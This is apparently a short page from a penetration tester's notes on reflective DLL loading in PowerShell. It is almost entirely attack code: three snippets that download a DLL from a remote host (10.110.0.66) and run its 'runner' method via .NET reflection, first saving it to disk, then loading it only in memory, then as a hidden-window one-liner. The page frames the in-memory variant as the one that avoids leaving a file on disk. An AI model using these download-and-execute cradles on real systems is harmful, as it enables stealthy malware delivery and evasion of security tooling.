# Reflective DLL loading

## Reflective DLL loading

### Drop a dll on disk

```csharp
New-Object System.Net.WebClient).DownloadFile("http://10.110.0.66/ClassLibrary2.dll","ClassLibrary2.dll")

# Load the Assembly
$assem = [System.Reflection.Assembly]::LoadFile("C:\Users\b3v1l\ClassLibrary2.dll")

# Use Reflection (GetType and GetMethod)
$class = $assem.GetType("ClassLibrary2.Class1")

$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
```

![](../../.gitbook/assets/image%20%28216%29.png)

{% hint style="warning" %}
DLL is downloaded and saved on the disk.
{% endhint %}

### Load in memory

```csharp
$data = (New-Object System.Net.WebClient).DownloadData("http://10.110.0.66/ClassLibrary2.dll")

# Load the Assembly
$assem = [System.Reflection.Assembly]::Load($data)

# Use Reflection (GetType and GetMethod)
$class = $assem.GetType("ClassLibrary2.Class1")

$method = $class.GetMethod("runner")
$method.Invoke(0, $null)


```

![](../../.gitbook/assets/image%20%2852%29.png)

#### One liner

```csharp
powershell.exe -windowstyle hidden -c $data = (New-Object System.Net.WebClient).DownloadData("http://10.110.0.66/ClassLibrary2.dll");$assem = [System.Reflection.Assembly]::Load($data);$class = $assem.GetType("ClassLibrary2.Class1");$method = $class.GetMethod("runner");$method.Invoke(0, $null)
```

